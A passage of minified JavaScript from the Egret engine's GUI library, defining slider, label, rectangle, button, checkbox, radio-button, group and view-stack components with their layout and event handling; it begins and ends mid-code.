n=i.target.localToGlobal(i.localX,i.localY);t.TouchEvent.dispatchTouchEvent(this,t.TouchEvent.TOUCH_TAP,i.touchPointID,n.x,n.y,i.ctrlKey,i.altKey,i.shiftKey,i.touchDown)}this.mouseDownTarget=null},n}(e.Range);e.TrackBase=i,i.prototype.__class__="egret.gui.TrackBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._showTrackHighlight=!0,this._pendingValue=0,this._liveDragging=!0,this.maximum=10}return __extends(n,i),Object.defineProperty(n.prototype,"showTrackHighlight",{get:function(){return this._showTrackHighlight},set:function(t){this._showTrackHighlight!=t&&(this._showTrackHighlight=t,this.trackHighlight&&(this.trackHighlight.visible=t),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"pendingValue",{get:function(){return this._pendingValue},set:function(t){t!=this._pendingValue&&(this._pendingValue=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),n.prototype.setValue=function(t){this._pendingValue=t,i.prototype.setValue.call(this,t)},n.prototype.animationUpdateHandler=function(t){this.pendingValue=t.currentValue.value},n.prototype.animationEndHandler=function(i){this.setValue(this.slideToValue),this.dispatchEventWith(t.Event.CHANGE),e.UIEvent.dispatchUIEvent(this,e.UIEvent.CHANGE_END)},n.prototype.stopAnimation=function(){this.animator.stop(),this.setValue(this.nearestValidValue(this.pendingValue,this.snapInterval)),this.dispatchEventWith(t.Event.CHANGE),e.UIEvent.dispatchUIEvent(this,e.UIEvent.CHANGE_END)},n.prototype.thumb_mouseDownHandler=function(t){this.animator&&this.animator.isPlaying&&this.stopAnimation(),i.prototype.thumb_mouseDownHandler.call(this,t)},Object.defineProperty(n.prototype,"liveDragging",{get:function(){return this._liveDragging},set:function(t){this._liveDragging=t},enumerable:!0,configurable:!0}),n.prototype.updateWhenMouseMove=function(){if(this.track){var i=this.track.globalToLocal(this._moveStageX,this._moveStageY,t.Point.identity),i=this.pointToValue(i.x-this._clickOffsetX,i.y-this._clickOffsetY);(i=this.nearestValidValue(i,this.snapInterval))!=this.pendingValue&&(e.TrackBaseEvent.dispatchTrackBaseEvent(this,e.TrackBaseEvent.THUMB_DRAG),1==this.liveDragging?(this.setValue(i),this.dispatchEventWith(t.Event.CHANGE)):this.pendingValue=i)}},n.prototype.stage_mouseUpHandler=function(e){i.prototype.stage_mouseUpHandler.call(this,e),0==this.liveDragging&&this.value!=this.pendingValue&&(this.setValue(this.pendingValue),this.dispatchEventWith(t.Event.CHANGE))},n.prototype.track_mouseDownHandler=function(i){this.enabled&&(i=this.track.globalToLocal(i.stageX-(this.thumb?this.thumb.width:0)/2,i.stageY-(this.thumb?this.thumb.height:0)/2,t.Point.identity),i=this.pointToValue(i.x,i.y),(i=this.nearestValidValue(i,this.snapInterval))!=this.pendingValue&&(0!=this.slideDuration?(this.animator||(this.animator=new e.Animation(this.animationUpdateHandler,this),this.animator.endFunction=this.animationEndHandler),this.animator.isPlaying&&this.stopAnimation(),this.slideToValue=i,this.animator.duration=this.slideDuration*(Math.abs(this.pendingValue-this.slideToValue)/(this.maximum-this.minimum)),this.animator.motionPaths=[{prop:"value",from:this.pendingValue,to:this.slideToValue}],e.UIEvent.dispatchUIEvent(this,e.UIEvent.CHANGE_START),this.animator.play()):(this.setValue(i),this.dispatchEventWith(t.Event.CHANGE))))},n.prototype.partAdded=function(e,n){i.prototype.partAdded.call(this,e,n),n==this.trackHighlight&&(this.trackHighlight.touchEnabled=!1,this.trackHighlight instanceof t.DisplayObjectContainer&&(this.trackHighlight.touchChildren=!1),this.trackHighlight.visible=this._showTrackHighlight)},n}(e.TrackBase);e.SliderBase=i,i.prototype.__class__="egret.gui.SliderBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(e){function i(){e.call(this),this._maxDisplayedLines=0,this.lastUnscaledWidth=NaN,this._padding=0,this._paddingBottom=this._paddingTop=this._paddingRight=this._paddingLeft=NaN,this.addEventListener(t.UIEvent.UPDATE_COMPLETE,this.updateCompleteHandler,this)}return __extends(i,e),i.prototype.updateCompleteHandler=function(t){this.lastUnscaledWidth=NaN},Object.defineProperty(i.prototype,"maxDisplayedLines",{get:function(){return this._maxDisplayedLines},set:function(t){this._maxDisplayedLines!=t&&(this._maxDisplayedLines=t,this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"padding",{get:function(){return this._padding},set:function(t){this._padding!=t&&(this._padding=t,this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingLeft",{get:function(){return this._paddingLeft},set:function(t){this._paddingLeft!=t&&(this._paddingLeft=t,this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingRight",{get:function(){return this._paddingRight},set:function(t){this._paddingRight!=t&&(this._paddingRight=t,this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingTop",{get:function(){return this._paddingTop},set:function(t){this._paddingTop!=t&&(this._paddingTop=t,this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingBottom",{get:function(){return this._paddingBottom},set:function(t){this._paddingBottom!=t&&(this._paddingBottom=t,this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),i.prototype.measure=function(){if(this._invalidatePropertiesFlag&&this.validateProperties(),this.isSpecialCase()){if(!isNaN(this.lastUnscaledWidth))return void this.measureUsingWidth(this.lastUnscaledWidth);this._oldPreferHeight=this._oldPreferWidth=NaN}var t;isNaN(this.explicitWidth)?1e4!=this.maxWidth&&(t=this.maxWidth):t=this.explicitWidth,this.measureUsingWidth(t)},i.prototype.isSpecialCase=function(){return 1!=this._maxDisplayedLines&&(!isNaN(this.percentWidth)||!isNaN(this.left)&&!isNaN(this.right))&&isNaN(this.explicitHeight)&&isNaN(this.percentHeight)},i.prototype.measureUsingWidth=function(t){var e=this._textField.text;this._textChanged&&(this._textField.text=this._text);var i=isNaN(this._padding)?0:this._padding,n=isNaN(this._paddingLeft)?i:this._paddingLeft,r=isNaN(this._paddingRight)?i:this._paddingRight,s=isNaN(this._paddingTop)?i:this._paddingTop,i=isNaN(this._paddingBottom)?i:this._paddingBottom;this._textField.width=NaN,this._textField.height=NaN,isNaN(t)||(this._textField.width=t-n-r),this.measuredWidth=Math.ceil(this._textField.measuredWidth),this.measuredHeight=Math.ceil(this._textField.measuredHeight),0<this._maxDisplayedLines&&this._textField.numLines>this._maxDisplayedLines&&(t=this._textField.lineSpacing,this.measuredHeight=(this._textField.size+t)*this._maxDisplayedLines-t),this.measuredWidth+=n+r,this.measuredHeight+=s+i,this._textField.text=e},i.prototype.updateDisplayList=function(t,e){this.$updateDisplayList(t,e);var i=isNaN(this._padding)?0:this._padding,n=isNaN(this._paddingLeft)?i:this._paddingLeft,r=isNaN(this._paddingRight)?i:this._paddingRight,s=isNaN(this._paddingTop)?i:this._paddingTop,i=isNaN(this._paddingBottom)?i:this._paddingBottom;if(this._textField.x=n,this._textField.y=s,this.isSpecialCase()){var o=isNaN(this.lastUnscaledWidth)||this.lastUnscaledWidth!=t;if(this.lastUnscaledWidth=t,o)return this._oldPreferHeight=this._oldPreferWidth=NaN,void this.invalidateSize()}this._invalidateSizeFlag&&this.validateSize(),this._textField.visible||(this._textField.visible=!0),this._textField.width=t-n-r,n=e-s-i,this._textField.height=n,0<this._maxDisplayedLines&&this._textField.numLines>this._maxDisplayedLines&&(r=this._textField.lineSpacing,this._textField.height=Math.min(n,(this._textField.size+r)*this._maxDisplayedLines-r))},i}(t.TextBase);t.Label=e,e.prototype.__class__="egret.gui.Label"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(){e.call(this),this._fillColor=16777215,this._fillAlpha=1,this._strokeColor=4473924,this._strokeAlpha=0,this._strokeWeight=1,this.touchChildren=!1}return __extends(i,e),Object.defineProperty(i.prototype,"graphics",{get:function(){return this._graphics||(this._graphics=new t.Graphics),this._graphics},enumerable:!0,configurable:!0}),i.prototype._render=function(t){this._graphics&&this._graphics._draw(t),e.prototype._render.call(this,t)},Object.defineProperty(i.prototype,"fillColor",{get:function(){return this._fillColor},set:function(t){this._fillColor!=t&&(this._fillColor=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"fillAlpha",{get:function(){return this._fillAlpha},set:function(t){this._fillAlpha!=t&&(this._fillAlpha=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"strokeColor",{get:function(){return this._strokeColor},set:function(t){this._strokeColor!=t&&(this._strokeColor=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"strokeAlpha",{get:function(){return this._strokeAlpha},set:function(t){this._strokeAlpha!=t&&(this._strokeAlpha=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"strokeWeight",{get:function(){return this._strokeWeight},set:function(t){this._strokeWeight!=t&&(this._strokeWeight=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),i.prototype._measureBounds=function(){var t=e.prototype._measureBounds.call(this),i=this.width,n=this.height;return 0<t.x&&(t.x=0),0<t.y&&(t.y=0),0+i>t.right&&(t.right=0+i),0+n>t.bottom&&(t.bottom=0+n),t},i.prototype.updateDisplayList=function(t,i){e.prototype.updateDisplayList.call(this,t,t);var n=this.graphics;n.clear(),n.beginFill(this._fillColor,this._fillAlpha),0<this._strokeAlpha&&n.lineStyle(this._strokeWeight,this._strokeColor,this._strokeAlpha,!0,"normal","square","miter"),n.drawRect(0,0,t,i),n.endFill()},i}(e.UIComponent);e.Rect=i,i.prototype.__class__="egret.gui.Rect"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(t){function e(){t.call(this),this.hostComponentKey="egret.gui.Button"}return __extends(e,t),e}(t.ButtonBase);t.Button=e,e.prototype.__class__="egret.gui.Button"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(t){function e(){t.call(this),this.hostComponentKey="egret.gui.ToggleButton"}return __extends(e,t),e}(t.ToggleButtonBase);t.ToggleButton=e,e.prototype.__class__="egret.gui.ToggleButton"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(t){function e(){t.call(this),this.hostComponentKey="egret.gui.CheckBox"}return __extends(e,t),e}(t.ToggleButtonBase);t.CheckBox=e,e.prototype.__class__="egret.gui.CheckBox"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this.radioButtons=[],this._enabled=!0,this._name="_radioButtonGroup"+n.groupCount,n.groupCount++}return __extends(n,i),Object.defineProperty(n.prototype,"enabled",{get:function(){return this._enabled},set:function(t){if(this._enabled!=t)for(this._enabled=t,t=0;t<this.numRadioButtons;t++)this.getRadioButtonAt(t).invalidateSkinState()},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"numRadioButtons",{get:function(){return this.radioButtons.length},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"selectedValue",{get:function(){return this.selection?null!=this.selection.value?this.selection.value:this.selection.label:null},set:function(t){if(this._selectedValue=t,null==t)this._setSelection(null,!1);else for(var i=this.numRadioButtons,n=0;n<i;n++){var r=this.getRadioButtonAt(n);if(r.value==t||r.label==t){this.changeSelection(n,!1),this._selectedValue=null,e.UIEvent.dispatchUIEvent(this,e.UIEvent.VALUE_COMMIT);break}}},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"selection",{get:function(){return this._selection},set:function(t){this._selection!=t&&this._setSelection(t,!1)},enumerable:!0,configurable:!0}),n.prototype.getRadioButtonAt=function(t){return 0<=t&&t<this.numRadioButtons?this.radioButtons[t]:null},n.prototype._addInstance=function(i){function n(t,i){var r=t.parent,s=i.parent;if(!r||!s)return 0;var o=t instanceof e.UIComponent?t.nestLevel:-1,a=i instanceof e.UIComponent?i.nestLevel:-1,h=0,l=0;return r==s&&(h="getElementIndex"in r&&"ownerChanged"in t?r.getElementIndex(t):r.getChildIndex(t),l="getElementIndex"in s&&"ownerChanged"in i?s.getElementIndex(i):s.getChildIndex(i)),o>a||h>l?1:o<a||l>h?-1:t==i?0:n(r,s)}i.addEventListener(t.Event.REMOVED,this.radioButton_removedHandler,this),this.radioButtons.push(i),this.radioButtons.sort(n);for(var r=0;r<this.radioButtons.length;r++)this.radioButtons[r]._indexNumber=r;this._selectedValue&&(this.selectedValue=this._selectedValue),1==i.selected&&(this.selection=i),i._radioButtonGroup=this,i.invalidateSkinState(),this.dispatchEventWith("numRadioButtonsChanged")},n.prototype._removeInstance=function(t){this.doRemoveInstance(t,!1)},n.prototype.doRemoveInstance=function(e,i){if(void 0===i&&(i=!0),e){for(var n=!1,r=0;r<this.numRadioButtons;r++){var s=this.getRadioButtonAt(r);n?s._indexNumber-=1:s==e&&(i&&e.addEventListener(t.Event.ADDED,this.radioButton_addedHandler,this),e==this._selection&&(this._selection=null),e._radioButtonGroup=null,e.invalidateSkinState(),this.radioButtons.splice(r,1),n=!0,r--)}n&&this.dispatchEventWith("numRadioButtonsChanged")}},n.prototype._setSelection=function(i,n){if(void 0===n&&(n=!0),this._selection!=i){if(i){for(var r=this.numRadioButtons,s=0;s<r;s++)if(i==this.getRadioButtonAt(s)){this.changeSelection(s,n);break}}else this.selection&&(this._selection.selected=!1,this._selection=null,n&&this.dispatchEventWith(t.Event.CHANGE));e.UIEvent.dispatchUIEvent(this,e.UIEvent.VALUE_COMMIT)}},n.prototype.changeSelection=function(e,i){void 0===i&&(i=!0);var n=this.getRadioButtonAt(e);n&&n!=this._selection&&(this._selection&&(this._selection.selected=!1),this._selection=n,this._selection.selected=!0,i&&this.dispatchEventWith(t.Event.CHANGE))},n.prototype.radioButton_addedHandler=function(e){(e=e.target)&&(e.removeEventListener(t.Event.ADDED,this.radioButton_addedHandler,this),this._addInstance(e))},n.prototype.radioButton_removedHandler=function(e){(e=e.target)&&(e.removeEventListener(t.Event.REMOVED,this.radioButton_removedHandler,this),this.doRemoveInstance(e))},n.groupCount=0,n}(t.EventDispatcher);e.RadioButtonGroup=i,i.prototype.__class__="egret.gui.RadioButtonGroup"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(e){function i(){e.call(this),this._indexNumber=0,this._radioButtonGroup=null,this.groupChanged=!1,this._groupName="radioGroup",this.hostComponentKey="egret.gui.RadioButton",this.groupName="radioGroup"}return __extends(i,e),Object.defineProperty(i.prototype,"enabled",{get:function(){return!!this._enabled&&(!this._radioButtonGroup||this._radioButtonGroup.enabled)},set:function(t){this._setEnabled(t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"group",{get:function(){if(!this._group&&this._groupName){i.automaticRadioButtonGroups||(i.automaticRadioButtonGroups={});var e=i.automaticRadioButtonGroups[this._groupName];e||(e=new t.RadioButtonGroup,e._name=this._groupName,i.automaticRadioButtonGroups[this._groupName]=e),this._group=e}return this._group},set:function(t){this._group!=t&&(this._radioButtonGroup&&this._radioButtonGroup._removeInstance(this),this._groupName=(this._group=t)?this.group._name:"radioGroup",this.groupChanged=!0,this.invalidateProperties(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"groupName",{get:function(){return this._groupName},set:function(t){t&&""!=t&&(this._groupName=t,this._radioButtonGroup&&this._radioButtonGroup._removeInstance(this),this._group=null,this.groupChanged=!0,this.invalidateProperties(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),i.prototype._setSelected=function(t){e.prototype._setSelected.call(this,t),this.invalidateDisplayList()},Object.defineProperty(i.prototype,"value",{get:function(){return this._value},set:function(e){this._value!=e&&(this._value=e,this.selected&&this.group&&t.UIEvent.dispatchUIEvent(this.group,t.UIEvent.VALUE_COMMIT))},enumerable:!0,configurable:!0}),i.prototype.commitProperties=function(){this.groupChanged&&(this.addToGroup(),this.groupChanged=!1),e.prototype.commitProperties.call(this)},i.prototype.updateDisplayList=function(t,i){e.prototype.updateDisplayList.call(this,t,i),this.group&&(this.selected?this._group.selection=this:this.group.selection==this&&(this._group.selection=null))},i.prototype.buttonReleased=function(){this.enabled&&!this.selected&&(this._radioButtonGroup||this.addToGroup(),e.prototype.buttonReleased.call(this),this.group._setSelection(this))},i.prototype.addToGroup=function(){var t=this.group;return t&&t._addInstance(this),t},i}(t.ToggleButtonBase);t.RadioButton=e,e.prototype.__class__="egret.gui.RadioButton"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this.elementsContentChanged=this.createChildrenCalled=!1,this._elementsContent=[]}return __extends(n,i),n.prototype.createChildren=function(){i.prototype.createChildren.call(this),this.createChildrenCalled=!0,this.elementsContentChanged&&(this.elementsContentChanged=!1,this.setElementsContent(this._elementsContent))},n.prototype._getElementsContent=function(){return this._elementsContent},Object.defineProperty(n.prototype,"elementsContent",{set:function(t){if(null==t&&(t=[]),t!=this._elementsContent)if(this.createChildrenCalled)this.setElementsContent(t);else{this.elementsContentChanged=!0;for(var e=this._elementsContent.length-1;0<=e;e--)this._elementRemoved(this._elementsContent[e],e);this._elementsContent=t}},enumerable:!0,configurable:!0}),n.prototype.setElementsContent=function(t){var e;for(e=this._elementsContent.length-1;0<=e;e--)this._elementRemoved(this._elementsContent[e],e);for(this._elementsContent=t.concat(),t=this._elementsContent.length,e=0;e<t;e++){var i=this._elementsContent[e];i.parent&&"removeElement"in i.parent?i.parent.removeElement(i):i.owner&&"removeElement"in i.owner&&i.owner.removeElement(i),this._elementAdded(i,e)}},Object.defineProperty(n.prototype,"numElements",{get:function(){return this._elementsContent.length},enumerable:!0,configurable:!0}),n.prototype.getElementAt=function(t){return this.checkForRangeError(t),this._elementsContent[t]},n.prototype.checkForRangeError=function(t,e){void 0===e&&(e=!1);var i=this._elementsContent.length-1;if(e&&i++,0>t||t>i)throw new RangeError('索引:"'+t+'"超出可视元素索引范围')},n.prototype.addElement=function(t){var e=this.numElements;return t.parent==this&&(e=this.numElements-1),this.addElementAt(t,e)},n.prototype.addElementAt=function(t,e){if(t==this)return t;this.checkForRangeError(e,!0);var i=t.owner;return i==this||t.parent==this?(this.setElementIndex(t,e),t):(i&&"removeElement"in i&&t.owner.removeElement(t),this._elementsContent.splice(e,0,t),this.elementsContentChanged||this._elementAdded(t,e),t)},n.prototype.removeElement=function(t){return this.removeElementAt(this.getElementIndex(t))},n.prototype.removeElementAt=function(t){this.checkForRangeError(t);var e=this._elementsContent[t];return this.elementsContentChanged||this._elementRemoved(e,t),this._elementsContent.splice(t,1),e},n.prototype.removeAllElements=function(){for(var t=this.numElements-1;0<=t;t--)this.removeElementAt(t)},n.prototype.getElementIndex=function(t){return this._elementsContent.indexOf(t)},n.prototype.setElementIndex=function(t,e){this.checkForRangeError(e);var i=this.getElementIndex(t);-1!=i&&i!=e&&(this.elementsContentChanged||this._elementRemoved(t,i,!1),this._elementsContent.splice(i,1),this._elementsContent.splice(e,0,t),this.elementsContentChanged||this._elementAdded(t,e,!1))},n.prototype.swapElements=function(t,e){this.swapElementsAt(this.getElementIndex(t),this.getElementIndex(e))},n.prototype.swapElementsAt=function(t,e){if(this.checkForRangeError(t),this.checkForRangeError(e),t>e){i=e;e=t,t=i}else if(t==e)return;var i,n=(i=this._elementsContent)[t],r=i[e];this.elementsContentChanged||(this._elementRemoved(n,t,!1),this._elementRemoved(r,e,!1)),i[t]=r,i[e]=n,this.elementsContentChanged||(this._elementAdded(r,t,!1),this._elementAdded(n,e,!1))},n.prototype._elementAdded=function(i,n,r){void 0===r&&(r=!0),i instanceof t.DisplayObject&&this._addToDisplayListAt(i,n,r),r&&this.hasEventListener(e.ElementExistenceEvent.ELEMENT_ADD)&&e.ElementExistenceEvent.dispatchElementExistenceEvent(this,e.ElementExistenceEvent.ELEMENT_ADD,i,n),this.invalidateSize(),this.invalidateDisplayList()},n.prototype._elementRemoved=function(i,n,r){void 0===r&&(r=!0),r&&this.hasEventListener(e.ElementExistenceEvent.ELEMENT_REMOVE)&&e.ElementExistenceEvent.dispatchElementExistenceEvent(this,e.ElementExistenceEvent.ELEMENT_REMOVE,i,n),i instanceof t.DisplayObject&&i.parent==this&&this._removeFromDisplayList(i,r),this.invalidateSize(),this.invalidateDisplayList()},n.prototype.addChild=function(t){throw Error("addChild()"+n.errorStr+"addElement()代替")},n.prototype.addChildAt=function(t,e){throw Error("addChildAt()"+n.errorStr+"addElementAt()代替")},n.prototype.removeChild=function(t){throw Error("removeChild()"+n.errorStr+"removeElement()代替")},n.prototype.removeChildAt=function(t){throw Error("removeChildAt()"+n.errorStr+"removeElementAt()代替")},n.prototype.setChildIndex=function(t,e){throw Error("setChildIndex()"+n.errorStr+"setElementIndex()代替")},n.prototype.swapChildren=function(t,e){throw Error("swapChildren()"+n.errorStr+"swapElements()代替")},n.prototype.swapChildrenAt=function(t,e){throw Error("swapChildrenAt()"+n.errorStr+"swapElementsAt()代替")},n.errorStr="在此组件中不可用，若此组件为容器类，请使用",n}(e.GroupBase);e.Group=i,i.prototype.__class__="egret.gui.Group"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._createAllChildren=!1,this.proposedSelectedIndex=n.NO_PROPOSED_SELECTION,this._selectedIndex=-1,this.childOrderingChanged=this.notifyTabBar=!1,this._setLayout(new e.BasicLayout)}return __extends(n,i),Object.defineProperty(n.prototype,"layout",{get:function(){return this._layout},set:function(t){},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"createAllChildren",{get:function(){return this._createAllChildren},set:function(e){if(this._createAllChildren!=e&&(this._createAllChildren=e)){for(var i=(e=this._getElementsContent()).length,n=0;n<i;n++){var r=e[n];r instanceof t.DisplayObject&&r.parent!=this&&(this.childOrderingChanged=!0,this._addToDisplayList(r))}this.childOrderingChanged&&this.invalidateProperties()}},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"selectedChild",{get:function(){var t=this.selectedIndex;return 0<=t&&t<this.numElements?this.getElementAt(t):null},set:function(t){0<=(t=this.getElementIndex(t))&&t<this.numElements&&this._setSelectedIndex(t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"selectedIndex",{get:function(){return this.proposedSelectedIndex!=n.NO_PROPOSED_SELECTION?this.proposedSelectedIndex:this._selectedIndex},set:function(t){this._setSelectedIndex(t)},enumerable:!0,configurable:!0}),n.prototype._setSelectedIndex=function(t,i){void 0===i&&(i=!0),t!=this.selectedIndex&&(this.proposedSelectedIndex=t,this.invalidateProperties(),e.UIEvent.dispatchUIEvent(this,e.UIEvent.VALUE_COMMIT),this.notifyTabBar=this.notifyTabBar||i)},n.prototype._elementAdded=function(i,n,r){void 0===r&&(r=!0),this._createAllChildren&&i instanceof t.DisplayObject&&this._addToDisplayListAt(i,n,r),r&&this.hasEventListener(e.ElementExistenceEvent.ELEMENT_ADD)&&e.ElementExistenceEvent.dispatchElementExistenceEvent(this,e.ElementExistenceEvent.ELEMENT_ADD,i,n),i.visible=!1,i.includeInLayout=!1,-1==this.selectedIndex?this._setSelectedIndex(n,!1):n<=this.selectedIndex&&this.initialized&&this._setSelectedIndex(this.selectedIndex+1),this.dispatchCoEvent(e.CollectionEventKind.ADD,n,-1,[i.name])},n.prototype._elementRemoved=function(t,n,r){void 0===r&&(r=!0),i.prototype._elementRemoved.call(this,t,n,r),t.visible=!0,t.includeInLayout=!0,n==this.selectedIndex?0<this.numElements?0==n?(this.proposedSelectedIndex=0,this.invalidateProperties()):this._setSelectedIndex(0,!1):this._setSelectedIndex(-1):n<this.selectedIndex&&this._setSelectedIndex(this.selectedIndex-1),this.dispatchCoEvent(e.CollectionEventKind.REMOVE,n,-1,[t.name])},n.prototype.commitProperties=function(){if(i.prototype.commitProperties.call(this),this.proposedSelectedIndex!=n.NO_PROPOSED_SELECTION&&(this.commitSelection(this.proposedSelectedIndex),this.proposedSelectedIndex=n.NO_PROPOSED_SELECTION),this.childOrderingChanged){this.childOrderingChanged=!1;for(var e=this._getElementsContent(),r=e.length,s=0;s<r;s++){var o=e[s];o instanceof t.DisplayObject&&o.parent==this&&this._addToDisplayList(o)}}this.notifyTabBar&&(this.notifyTabBar=!0,this.dispatchEventWith("IndexChanged"))},n.prototype.commitSelection=function(e){0<=e&&e<this.numElements?(this._selectedIndex=e,this._selectedChild&&this._selectedChild.parent==this&&(this._selectedChild.visible=!1,this._selectedChild.includeInLayout=!1),this._selectedChild=this.getElementAt(this._selectedIndex),this._selectedChild.visible=!0,this._selectedChild.includeInLayout=!0,this._selectedChild.parent!=this&&this._selectedChild instanceof t.DisplayObject&&(this._addToDisplayList(this._selectedChild),this.childOrderingChanged||(this.childOrderingChanged=!0))):(this._selectedChild=null,this._selectedIndex=-1),this.invalidateSize(),this.invalidateDisplayList()},Object.defineProperty(n.prototype,"length",{get:function(){return this.numElements},enumerable:!0,configurable:!0}),n.prototype.getItemAt=function(t){return(t=this.getElementAt(t))?t.name:""},n.prototype.getItemIndex=function(t){for(var e=this._getElementsContent(),i=e.length,n=0;n<i;n++)if(e[n].name===t)return n;return-1},n.prototype.dispatchCoEvent=function(t,i,n,r,s){void 0===t&&(t=null),void 0===i&&(i=-1),void 0===n&&(n=-1),void 0===r&&(r=null),void 0===s&&(s=null),e.CollectionEvent.dispatchCollectionEvent(this,e.CollectionEvent.COLLECTION_CHANGE,t,i,n,r,s)},n.NO_PROPOSED_SELECTION=-2,n}(e.Group);e.ViewStack=i,i.prototype.__class__="egret.gui.ViewStack"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this.maxWidth=1e4,this.minWidth=0,this.maxHeight=1e4,this.minHeight=0,this.height=this.width=NaN,this._initialized=!1,this._elementsContent=[],this._states=[],this.initialized=!1}return __extends(n,i),n.prototype.createChildren=function(){},Object.defineProperty(n.prototype,"hostComponent",{get:function(){return this._hostComponent},set:function(t){this._setHostComponent(t)},enumerable:!0,configurable:!0}),n.prototype._setHostComponent=function(t){if(this._hostComponent!=t){var e;if(this._hostComponent)for(e=this._elementsContent.length-1;0<=e;e--)this._elementRemoved(this._elementsContent[e],e);if(this._hostComponent=t,this._initialized||(this._initialized=!0,this.createChildren()),this._hostComponent){for(t=this._elementsContent.length,e=0;e<t;e++)this._elementAdded(this._elementsContent[e],e);this.initializeStates(),this.currentStateChanged&&this.commitCurrentState()}}},n.prototype._getElementsContent=function(){return this._elementsContent},Object.defineProperty(n.prototype,"elementsContent",{set:function(t){if(null==t&&(t=[]),t!=this._elementsContent)if(this._hostComponent){var e;for(e=this._elementsContent.length-1;0<=e;e--)this._elementRemoved(this._elementsContent[e],e);for(this._elementsContent=t.concat(),t=this._elementsContent.length,e=0;e<t;e++){var i=this._elementsContent[e];i.parent&&"removeElement"in i.parent?i.parent.removeElement(i):i.owner&&"removeElement"in i.owner&&i.owner.removeElement(i),this._elementAdded(i,e)}}else this._elementsContent=t.concat()},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"numElements",{get:function(){return this._elementsContent.length},enumerable:!0,configurable:!0}),n.prototype.getElementAt=function(t){return this.checkForRangeError(t),this._elementsContent[t]},n.prototype.checkForRangeError=function(t,e){void 0===e&&(e=!1);var i=this._elementsContent.length-1;if(e&&i++,0>t||t>i)throw new RangeError('索引:"'+t+'"超出可视元素索引范围')},n.prototype.addElement=function(t){var e=this.numElements;return t.owner==this&&(e=this.numElements-1),this.addElementAt(t,e)},n.prototype.addElementAt=function(t,e){this.checkForRangeError(e,!0);var i=t.owner;return i==this?(this.setElementIndex(t,e),t):(i&&"removeElement"in i&&i.removeElement(t),this._elementsContent.splice(e,0,t),this._hostComponent?this._elementAdded(t,e):t.ownerChanged(this),t)},n.prototype.removeElement=function(t){return 